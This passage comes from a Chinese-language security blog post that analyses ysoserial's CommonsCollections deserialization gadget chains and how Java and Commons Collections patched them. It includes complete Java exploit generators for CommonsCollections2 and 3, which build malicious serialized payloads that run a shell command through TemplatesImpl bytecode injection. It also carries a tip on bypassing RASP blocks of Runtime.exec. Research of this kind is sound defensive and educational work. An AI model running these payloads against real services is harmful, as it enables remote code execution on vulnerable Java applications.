class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来问题是 java 是如何修复的呢? 一开始不知道已经修复, 复现出来导致还以为自己写错了 233<br>看到 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>才发现有可能是 java 内部类动过的原因.</p><p>拿最新版的 <code>readObject</code> 与上面 u66 版本的对比一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField fields = s.readFields();</span><br><span class="line">    Class&lt;? extends Annotation&gt; t = (Class)fields.get(<span class="string">"type"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map)fields.get(<span class="string">"memberValues"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(t);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">    String name;</span><br><span class="line">    Object value;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = streamVals.entrySet().iterator(); var8.hasNext(); mv.put(name, value)) &#123;</span><br><span class="line">        Entry&lt;String, Object&gt; memberValue = (Entry)var8.next();</span><br><span class="line">        name = (String)memberValue.getKey();</span><br><span class="line">        value = <span class="keyword">null</span>;</span><br><span class="line">        Class&lt;?&gt; memberType = (Class)memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!memberType.isInstance(value) &amp;&amp; !(value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                value = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>)).setMember((Method)annotationType.members().get(name));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, t);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到很明显的两处变化是 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, t);</span><br><span class="line">AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, mv);</span><br></pre></td></tr></table></figure><p>其将反序列化后的 memberValues 设为了 mv, 而 mv 是  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Object&gt; mv = <span class="keyword">new</span> LinkedHashMap();</span><br></pre></td></tr></table></figure><p>不是我们设置的 LazyMap, 这自然导致了在外层 AnnotationInvocationHandler 调用 proxy 时, 内层的 AnnotationInvocationHandler 的 memberValues 是 被重新设置的 LinkedHashMap, 而不是我们构造的 LazyMap, 自然就无法利用了.</p><p>看看 java 对 AnnotationInvocationHandler 的修复</p><p>ysoseiral 这个 exp 在 2015 年初被发布<br><img src="https://i.loli.net/2020/01/21/qfzXF9TOvtIoKxb.png" alt=""></p><p>查看 git 的 history, 可以看到在 2015 年 12 月被修复<br><img src="https://i.loli.net/2020/01/21/fBmpoH35E1hgj9e.png" alt="">  </p><p>java8u71 2016 年初发布<br><img src="https://i.loli.net/2020/01/21/RVu7qSnNl2FQBt6.png" alt="">  </p><p>再看 commons-collections3 的修复:</p><p><img src="https://i.loli.net/2020/01/23/XgxnUcD3A1rJFGb.png" alt="">  </p><p>在 readObject, writeObject 时都做了检测, 需要设置对应的 Property 为 true 才能反序列化 InvokerTransformer.  </p><p>看这个漏洞的历史, 也是非常有趣的. </p><h2 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h2><p>还是先看调用栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue.readObject()</span><br><span class="line">            ...</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure><p>这个 gadget 比较特殊的是用了 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个内置类, 这个类的骚操作就是, 在调用他的 <code>newTransformer</code> 或者 <code>getOutputProperties</code> (这个方法内部会调用 <code>newTransformer</code>) 时, 会动态从字节码中重建一个类. 这就使得如果我们能操作字节码, 就能在创建类时执任意 java 代码.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    TransformerImpl transformer = <span class="keyword">new</span> TransformerImpl(<span class="keyword">this</span>.getTransletInstance(), <span class="keyword">this</span>._outputProperties, <span class="keyword">this</span>._indentNumber, <span class="keyword">this</span>._tfactory);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(<span class="keyword">this</span>._uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._tfactory.getFeature(<span class="string">"http://javax.xml.XMLConstants/feature/secure-processing"</span>)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._name == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._class == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.defineTransletClasses(); <span class="comment">// 这个方法里面调用了 ClassLoader 加载 bytecode</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//... 省略</span></span><br></pre></td></tr></table></figure><p>同时在这个 gadget 中, 没有使用之前的 LazyMap, 而是使用的是 PriorityQueue + TransformingComparator 这套组合拳.<br>不过这个 exp 只对 CommonsCollections4 有效, 在 3 中 TransformingComparator 没有 implements Serializable, 导致无法序列化.  </p><p>java.util.PriorityQueue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    s.readInt();</span><br><span class="line">    SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Object[].class, <span class="keyword">this</span>.size);</span><br><span class="line">    Object[] es = <span class="keyword">this</span>.queue = <span class="keyword">new</span> Object[Math.max(<span class="keyword">this</span>.size, <span class="number">1</span>)];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> n = <span class="keyword">this</span>.size; i &lt; n; ++i) &#123;</span><br><span class="line">        es[i] = s.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PriorityQueue readObject 时, 在读取完对象后, 会调用 heapify 来进行排序, 而排序方法是可以自定义的 (利用 Comparator 接口), 配合上 TransformingComparator.  </p><p>org.apache.commons.collections4.comparators.TransformingComparator (实现了 Comparator 接口)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在排序时会先 transform 一下, 再结合喜闻乐见的 InvokeTransfer, 导致 RCE.</p><p>最后 exp 如下: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Placeholder</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Placeholder.class));</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));</span><br><span class="line"></span><br><span class="line">        CtClass placeholder = classPool.get(Placeholder.class.getName());</span><br><span class="line">        placeholder.setSuperclass(classPool.get(Class.forName(AbstractTranslet).getName()));</span><br><span class="line">        placeholder.makeClassInitializer().insertAfter(<span class="string">"java.lang.Runtime.getRuntime().exec(\"touch /dev/shm/rmb122_test1\");"</span>); <span class="comment">// 这里 insertBefore 还是 After 都一样</span></span><br><span class="line">        placeholder.setName(<span class="string">"demo.rmb122."</span> + System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytecode = placeholder.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(TemplatesImpl).getConstructor(<span class="keyword">new</span> Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field fieldByteCodes = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldByteCodes.set(templates, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line"></span><br><span class="line">        Field fieldName = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldName.set(templates, <span class="string">"rmb122"</span>);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(invokerTransformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field = PriorityQueue.class.getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] innerArr = (Object[]) field.get(queue);</span><br><span class="line">        innerArr[<span class="number">0</span>] = templates;</span><br><span class="line">        innerArr[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">        field = PriorityQueue.class.getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成字节码用的是 ysoseiral 一样的 javassist, 可以在正常的字节码前后插入恶意 payload.<br>另外这里因为是运行的字节码, 所以其实变通方法很多, 如果只是想读写文件但有 RASP ban 掉了 Runtime.exec, 其实可以通过 File 来读写文件.  </p><p>4 的修复方法比较粗暴, 直接干掉了 InvokerTransformer 的 Serializable 继承.  </p><p><img src="https://i.loli.net/2020/01/27/2aVoPLzdcXFfRj5.png" alt=""></p><h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><p>这个与上面的 CommonsCollections1 接近, 区别是将一串的 InvokerTransformer 换成了 InstantiateTransformer, 利用刚刚在 CommonsCollections2 介绍的 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 导致 RCE. 本质是换汤不换药.</p><p>InstantiateTransformer 做的工作是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span> + (input == <span class="keyword">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是将类实例化, 也就是调用 input 的构造函数, 这里 InstantiateTransformer 能替换 InvokerTransformer 的原因是内置类 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 在构造时,  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>._templates = templates;</span><br><span class="line">    <span class="keyword">this</span>._transformer = (TransformerImpl)templates.newTransformer();</span><br><span class="line">    <span class="keyword">this</span>._transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(<span class="keyword">this</span>._transformer);</span><br><span class="line">    <span class="keyword">this</span>._overrideDefaultParser = <span class="keyword">this</span>._transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会调用 templates 的 newTransformer 方法, 其实这里 InstantiateTransformer 起到的作用是和 InvokerTransformer 一样的.</p><p>exp 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Placeholder</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String TrAXFilter = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(CommonsCollections3.Placeholder.class));</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));</span><br><span class="line"></span><br><span class="line">        CtClass placeholder = classPool.get(CommonsCollections3.Placeholder.class.getName());</span><br><span class="line">        placeholder.setSuperclass(classPool.get(Class.forName(AbstractTranslet).getName()));</span><br><span class="line">        placeholder.makeClassInitializer().insertAfter(<span class="string">"java.lang.Runtime.getRuntime().exec(\"touch /dev/shm/rmb122_test1\");"</span>);</span><br><span class="line">        placeholder.setName(<span class="string">"demo.rmb122."</span> + System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytecode = placeholder.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(TemplatesImpl).getConstructor(<span class="keyword">new</span> Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field fieldByteCodes = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldByteCodes.set(templates, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line"></span><br><span class="line">        Field fieldName = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldName.set(templates, <span class="string">"rmb122"</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(TrAXFilter)),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);</span><br><span class="line">        Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, invo);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Deprecated.class, proxy);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2><p>这个与上面的 CommonsCollections2 接近, 区别是将 InvokerTransformer 替换为 InstantiateTransformer, 换汤不换药 + 1, 不再多做解释  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 